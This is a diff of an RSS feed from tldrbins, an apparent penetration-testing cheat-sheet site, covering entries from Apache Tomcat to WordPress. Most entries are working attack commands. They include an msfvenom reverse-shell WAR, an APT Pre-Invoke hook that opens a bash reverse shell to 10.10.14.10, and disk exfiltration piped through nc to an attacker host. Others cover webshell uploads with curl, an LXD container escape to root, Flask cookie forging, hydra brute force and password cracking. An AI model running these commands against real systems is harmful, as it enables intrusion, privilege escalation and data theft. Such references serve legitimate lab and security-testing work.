@@ -19,7 +19,14 @@
       <link>https://tldrbins.github.io/apache_tomcat/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/apache_tomcat/</guid>
-      <description> RCE (Authenicated) # Create a malicious WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.7 LPORT=1337 -f war -o revshell.war # 1. Login to Tomcat Web Application Manager # 2. WAR file to deploy -&amp;gt; Deploy # 3. Click /revshell in Applications table </description>
+      <description> RCE (Authenicated) # Create malicious WAR file msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.7 LPORT=1337 -f war -o revshell.war +------------------------------------------+ |Exploit | +------------------------------------------+ |1. Login to Tomcat Web Application Manager| |2. WAR file to deploy -&amp;gt; Deploy | |3. Click /revshell in Applications table | +------------------------------------------+ </description>
+    </item>
+    <item>
+      <title>Apt</title>
+      <link>https://tldrbins.github.io/apt/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/apt/</guid>
+      <description> Privesc Abuse apt update # Create a malicious config echo &amp;#39;APT::Update::Pre-Invoke {&amp;#34;bash -c &amp;#39;\&amp;#39;&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.10/1337 0&amp;gt;&amp;amp;1&amp;#39;\&amp;#39;&amp;#39;&amp;#34;}&amp;#39; &amp;gt; /etc/apt/apt.conf.d/evil # Exploit sudo apt update -y </description>
     </item>
     <item>
       <title>ASP</title>
@@ -40,14 +47,14 @@
       <link>https://tldrbins.github.io/connection_from_public_internet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/connection_from_public_internet/</guid>
-      <description>Simply Catch HTTP Request webhook.site webhook.site&#xA;Catch HTTP Request and Host a Web Server serveo.net # Redirect http request to localhost:3000 ssh -R 80:localhost:3000 serveo.net # Start a local HTTP server python3 -m http.server 3000 ngrok Download ngrok&#xA;ngrok http 80 Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
+      <description>Simply Catch HTTP Request webhook.site&#xA;Catch HTTP Request and Host a Web Server serveo.net # Start a local HTTP server python3 -m http.server 3000 # Redirect http request to localhost:3000 ssh -R 80:localhost:3000 serveo.net ngrok Download ngrok&#xA;ngrok http 80 Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS</description>
     </item>
     <item>
       <title>Curl</title>
       <link>https://tldrbins.github.io/advance_curl/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/advance_curl/</guid>
-      <description> Advance curl # PUT request with a file curl -X PUT http://example.com/test.txt -d @test.txt # Upload as binary (preserve newlines and control characters) curl -X PUT http://example.com/test.txt --data-binary @test.aspx # POST request with with form param `file` curl -X POST -F &amp;#34;file=@shell.php;type=application/php;filename=shell.php&amp;#34; &amp;#39;http://example.com/upload&amp;#39; </description>
+      <description>Advance curl # Url encode POST data curl --data-urlencode &amp;#39;cmd=ping -c3 10.10.14.10&amp;#39; http://10.10.11.10/cmd.php # PUT request with a file curl -X PUT http://10.10.11.10/test.txt -d @test.txt # PUT request with a file (with creds) curl -X PUT http://user:password@10.10.11.10/test.txt -d @test.txt # Upload as binary (preserve newlines and control characters) curl -X PUT http://10.10.11.10/test.txt --data-binary @test.aspx # POST request with form param `file` and attach a file curl -X POST -F &amp;#34;file=@shell.</description>
     </item>
     <item>
       <title>Custom Word List Generator</title>
@@ -61,7 +68,7 @@
       <link>https://tldrbins.github.io/disk/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/disk/</guid>
-      <description>Abuse disk group to read container&amp;rsquo;s filesystem # Show devices lsblk # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp 4444 &amp;gt; dm-0.gz # Exfil filesystem (target container rootfs, e.g., dm-0) dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.10 4444 # Extract dm-0 gunzip dm-0.gz # Mount the filesystem sudo mount dm-0-orig /mnt/ # Privilege read ls /mnt/root/ Note: can take a long time to transfer</description>
+      <description>Abuse disk group to read container&amp;rsquo;s filesystem # Show devices lsblk # Show LVM mappings ls -l /dev/mapper/ # In our local machine nc -lvnp 4444 &amp;gt; dm-0.gz # Exfil filesystem (target container rootfs, e.g. dm-0) dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.10 4444 # Extract dm-0 gunzip dm-0.gz # Mount the filesystem sudo mount dm-0-orig /mnt/ # Privilege read ls /mnt/root/ Note: can take a long time to transfer</description>
     </item>
     <item>
       <title>DNS Enum</title>
@@ -82,7 +89,7 @@
       <link>https://tldrbins.github.io/dotnet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/dotnet/</guid>
-      <description> dotnet Compile c# project from Linux Download dotnet&#xA;# Check if dotnet installed dotnet --info mkdir new_project cd new_project # Init a project dot new console # Add dependencies if needed dotnet add package System.XXXX.XXXX.XXXX --version 1.0.0 # Add code to Program.cs # Run dotnet run </description>
+      <description> Compile c# project from Linux Download dotnet&#xA;# Check dotnet --info # Prepare mkdir new_project cd new_project # Init dotnet new console # Add dependencies (optional) dotnet add package System.XXXX.XXXX.XXXX --version 1.0.0 +----------------------+ |Add Code to Program.cs| +----------------------+ # Run dotnet run </description>
     </item>
     <item>
       <title>Drupal</title>
@@ -96,7 +103,7 @@
       <link>https://tldrbins.github.io/file_transfer_linux_to_linux/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_linux_to_linux/</guid>
-      <description>HTTP # Start a local HTTP server python3 -m http.server 80 # wget wget http://10.10.14.10/file # curl curl http://10.10.14.10/file -o /tmp/file nc # In our local Linux machine nc -lvnp 4444 &amp;lt; file # In target Linux machine nc -w3 10.10.14.10 4444 &amp;gt; file scp Remote to Local # If you have target password scp user@10.10.11.10:/tmp/remote/file /tmp/local/file # If you have assh key scp -i id_rsa user@10.10.11.10:/tmp/remote/file /tmp/local/file Local to Remote # If you have target password scp /tmp/local/file user@10.</description>
+      <description>HTTP # Start a local HTTP server python3 -m http.server 80 # wget wget http://10.10.14.10/file # curl curl http://10.10.14.10/file -o /tmp/file nc # In our local Linux machine nc -lvnp 4444 &amp;lt; file # In target Linux machine nc -w3 10.10.14.10 4444 &amp;gt; file scp Remote to Local # If you have target password scp user@10.10.11.10:/tmp/remote/file /tmp/local/file # If you have a ssh key scp -i id_rsa user@10.10.11.10:/tmp/remote/file /tmp/local/file Local to Remote # If you have target password scp /tmp/local/file user@10.</description>
     </item>
     <item>
       <title>File Transfer (Linux to Windows)</title>
@@ -127,6 +134,13 @@
       <description> Flask Cookie pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie &amp;#34;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k&amp;#34; # Brute force secret key flask-unsign --unsign --cookie &amp;#34;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k&amp;#34; -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie &amp;#34;{&amp;#39;logged_in&amp;#39;: True, &amp;#39;username&amp;#39;: &amp;#39;admin&amp;#39;}&amp;#34; --secret &amp;#34;secret123&amp;#34; </description>
     </item>
     <item>
+      <title>FTP</title>
+      <link>https://tldrbins.github.io/ftp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ftp/</guid>
+      <description> Basic # Connect ftp 10.10.11.10 +-------------------+ |Anonymous login | +-------------------+ |Username: anonymous| |Password: (empty) | +-------------------+ # List ls # Download get filename # Upload put filename # Exit quit </description>
+    </item>
+    <item>
       <title>git</title>
       <link>https://tldrbins.github.io/git/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -138,14 +152,14 @@
       <link>https://tldrbins.github.io/hydra/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/hydra/</guid>
-      <description> Hydra Web Page Login Form hydra 10.10.11.10 -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.txt https-post-form &amp;#34;/login.php:username=admin&amp;amp;password=^PASS^&amp;amp;remember=yes:Incorrect password&amp;#34; -l : username -P : wordlist https-post-form : service /login.php : action ^PASS^ : payload indicator Incorrect password : login failure string </description>
+      <description> Hydra Web Page Login Form hydra 10.10.11.10 -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.txt https-post-form &amp;#34;/login.php:username=admin&amp;amp;password=^PASS^&amp;amp;remember=yes:Incorrect password&amp;#34; +-----------------------------------------+ |-l : username | |-P : wordlist | |https-post-form : service | |/login.php : action | |^PASS^ : payload indicator | |Incorrect password : login failure string| +-----------------------------------------+ </description>
     </item>
     <item>
       <title>IIS</title>
       <link>https://tldrbins.github.io/iis/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/iis/</guid>
-      <description>IIS Version Version Start Date End Date IIS 10 on Windows Server 2019 Nov 13, 2018 Jan 9, 2029 IIS 10 on Windows Server (Semi-Annual Channel) Oct 17, 2017 IIS 10 on Windows Server 2016 Oct 15, 2016 Jan 12, 2027 IIS 10 on Windows 10 Pro Jul 29, 2015 IIS 10 on Windows 10, Enterprise and Education Jul 29, 2015 IIS 8.5 on Windows Server 2012 R2 Nov 25, 2013 Oct 10, 2023 IIS 8.</description>
+      <description>IIS Version +-------------------------------------------------------------------------------+ |Version Start Date End Date | +-------------------------------------------------------------------------------+ |IIS 10 on Windows Server 2019 Nov 13, 2018 Jan 9, 2029 | |IIS 10 on Windows Server (Semi-Annual Channel) Oct 17, 2017 | |IIS 10 on Windows Server 2016 Oct 15, 2016 Jan 12, 2027| |IIS 10 on Windows 10 Pro Jul 29, 2015 | |IIS 10 on Windows 10, Enterprise and Education Jul 29, 2015 | |IIS 8.</description>
     </item>
     <item>
       <title>Java</title>
@@ -166,7 +180,7 @@
       <link>https://tldrbins.github.io/keepass/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/keepass/</guid>
-      <description> kpcli Download kpcli&#xA;# Open kdbx kpcli --kdb key.kdbx # List all passwords find . # Show password (e.g., #0) show -f 0 </description>
+      <description> kpcli Download kpcli&#xA;# Open kdbx kpcli --kdb key.kdbx # List all passwords find . # Show password (e.g. #0) show -f 0 </description>
     </item>
     <item>
       <title>Kerberos</title>
@@ -187,7 +201,7 @@
       <link>https://tldrbins.github.io/lxd/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/lxd/</guid>
-      <description>Basic Commands # Check if user in lxd group id # List containers lxc list # List image lxc image list Privesc / Container Escape # Upload a 656 bytes conatiner image echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d &amp;gt; test.tar.bz2 # Import image lxc image import test.tar.bz2 --alias testImage # Check image lxc image list # Init VM lxc init testImage testVM -c security.privileged=true # Mount the host / lxc config device add testVM realRoot disk source=/ path=r # Start VM lxc start testVM # Check containers lxc list # Execute as root inside container lxc exec testVM -- /bin/bash # We have full access on host disk thru /r/ ls -la /r/root Build image for other arch git clone git clone https://github.</description>
+      <description>Basic Commands # Check if user in lxd group id # List containers lxc list # List images lxc image list Privesc / Container Escape # Upload a 656 bytes conatiner image echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d &amp;gt; test.tar.bz2 # Import image lxc image import test.tar.bz2 --alias testImage # Check image lxc image list # Init VM lxc init testImage testVM -c security.privileged=true # Mount the host / lxc config device add testVM realRoot disk source=/ path=r # Start VM lxc start testVM # Check containers lxc list # Execute as root inside container lxc exec testVM -- /bin/bash # We have full access on host disk thru /r/ ls -la /r/root Build image for other arch git clone git clone https://github.</description>
     </item>
     <item>
       <title>Magic Bytes</title>
@@ -320,14 +334,14 @@
       <link>https://tldrbins.github.io/padding_oracle/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/padding_oracle/</guid>
-      <description> padbuster Download padbuster&#xA;# 8 or 16 : block size # encoding 0 : base64 padbuster http://10.10.11.10/index.php COOKIE_VALUE 8 -cookies COOKIE_NAME=COOKIE_VALUE -encoding 0 # Forge cookie value, e.g., user=admin padbuster http://10.10.11.10/index.php COOKIE_VALUE 8 -cookies COOKIE_NAME=COOKIE_VALUE -encoding 0 -plaintext user=admin </description>
+      <description> padbuster Download padbuster&#xA;# 8 or 16 : block size # encoding 0 : base64 padbuster http://10.10.11.10/index.php COOKIE_VALUE 8 -cookies COOKIE_NAME=COOKIE_VALUE -encoding 0 # Forge cookie value, e.g. user=admin padbuster http://10.10.11.10/index.php COOKIE_VALUE 8 -cookies COOKIE_NAME=COOKIE_VALUE -encoding 0 -plaintext user=admin </description>
     </item>
     <item>
       <title>Password Cracking</title>
       <link>https://tldrbins.github.io/password_cracking/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/password_cracking/</guid>
-      <description>john Download john&#xA;Convert file to john hash format # For example ssh2john id_rsa_encrypted &amp;gt; hash keepass2john test.kdbx &amp;gt; hash zip2john test.zip &amp;gt; hash # Get a full list of *2john find / -name *2john 2&amp;gt;/dev/null Crack with john # General use john --wordlist=/usr/share/wordlists/rockyou.txt hash # Specify hash format john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512 # Show cracked hash john --show hash # Show cracked hash with specific format john --show hash --format=Raw-SHA512 hashcat # Auto detect hash format hashcat hash # Specify hash format hashcat -m 13400 -a 0 hash /usr/share/wordlists/rockyou.</description>
+      <description>john Convert file to john hash format # For example ssh2john id_rsa_encrypted &amp;gt; hash keepass2john test.kdbx &amp;gt; hash zip2john test.zip &amp;gt; hash # Get a full list of *2john find / -name *2john 2&amp;gt;/dev/null Basic # General use john --wordlist=/usr/share/wordlists/rockyou.txt hash # Specify hash format john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512 # Show cracked hash john --show hash # Show cracked hash with specific format john --show hash --format=Raw-SHA512 hashcat Basic # Auto detect hash format hashcat hash # Specify hash format hashcat -m 13400 -a 0 hash /usr/share/wordlists/rockyou.</description>
     </item>
     <item>
       <title>Phishing</title>
@@ -400,6 +414,13 @@
       <description>sqlmap Download sqlmap&#xA;# In Burp Suite, we can right click the request and click `copy to file` to save the request # And add `*` to request to indicate the sql injection point # Initial testing HTTP sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 # Initial testing HTTPS sqlmap -r request --batch --banner --proxy=http://127.0.0.1:8080 --level 3 --risk 3 --threads=10 --force-ssl # Add a string to indicate injection succeed (e.</description>
     </item>
     <item>
+      <title>Squid Proxy</title>
+      <link>https://tldrbins.github.io/squid_proxy/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/squid_proxy/</guid>
+      <description>Config location /etc/squid/squid.conf Connect via FoxyProxy Firefox plugin +------------------------+ |Settings | +------------------------+ |Title : squid proxy| |Proxy Type : HTTP | |Proxy IP : 10.10.11.10| |Port : 3128 | |Username : (If any) | |Password : (If any) | +------------------------+ # Connect http://10.10.11.10 http://127.0.0.1 Internal ports scan via proxy # 1. Take note of word size, then Ctrl+C wfuzz -z range,1-1000 -p 10.10.11.10:3128:HTTP -u http://127.0.0.1:FUZZ # 2. Re-run with word size filter wfuzz -z range,1-65535 -p 10.</description>
+    </item>
+    <item>
       <title>SSH</title>
       <link>https://tldrbins.github.io/ssh/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -460,14 +481,14 @@
       <link>https://tldrbins.github.io/webdav/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/webdav/</guid>
-      <description> davtest Download davtest&#xA;davtest -url http://10.10.11.10 curl # Rename a remote file curl -X MOVE -H &amp;#39;Destination:http://example.com/test.php&amp;#39; http://example.com/test.txt </description>
+      <description> davtest Download davtest&#xA;# Without creds davtest -url http://10.10.11.10 # With creds davtest -url http://10.10.11.10 -auth user:password curl # Rename a remote file curl -X MOVE -H &amp;#39;Destination:http://example.com/test.php&amp;#39; http://example.com/test.txt </description>
     </item>
     <item>
       <title>Windows ACLs</title>
       <link>https://tldrbins.github.io/windows_acls/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/windows_acls/</guid>
-      <description> Window ACLs (Access Control Lists) Check ACLs icacls &amp;#34;C:\Users\User&amp;#34; F (full access) M (modify access) RX (read and execute access) R (read-only access) W (write-only access) D (delete) RC (read control) WDAC (write DAC) WO (write owner) S (synchronize) AS (access system security) MA (maximum allowed) GR (generic read) GW (generic write) GE (generic execute) GA (generic all) RD (read data/list directory) WD (write data/add file) AD (append data/add subdirectory) REA (read extended attributes) WEA (write extended attributes) X (execute/traverse) DC (delete child) RA (read attributes) WA (write attributes) OI (object inherit) CI (container inherit) IO (inherit only) NP (do not propagate inherit) I (permission inherited from parent container) </description>
+      <description> Window ACLs (Access Control Lists) Check ACLs icacls &amp;#34;C:\Users\User&amp;#34; +-------------------------------------------------+ |F (full access) | |M (modify access) | |RX (read and execute access) | |R (read-only access) | |W (write-only access) | |D (delete) | |RC (read control) | |WDAC (write DAC) | |WO (write owner) | |S (synchronize) | |AS (access system security) | |MA (maximum allowed) | |GR (generic read) | |GW (generic write) | |GE (generic execute) | |GA (generic all) | |RD (read data/list directory) | |WD (write data/add file) | |AD (append data/add subdirectory) | |REA (read extended attributes) | |WEA (write extended attributes) | |X (execute/traverse) | |DC (delete child) | |RA (read attributes) | |WA (write attributes) | |OI (object inherit) | |CI (container inherit) | |IO (inherit only) | |NP (do not propagate inherit) | |I (permission inherited from parent container)| +-------------------------------------------------+ </description>
     </item>
     <item>
       <title>Wordpress</title>
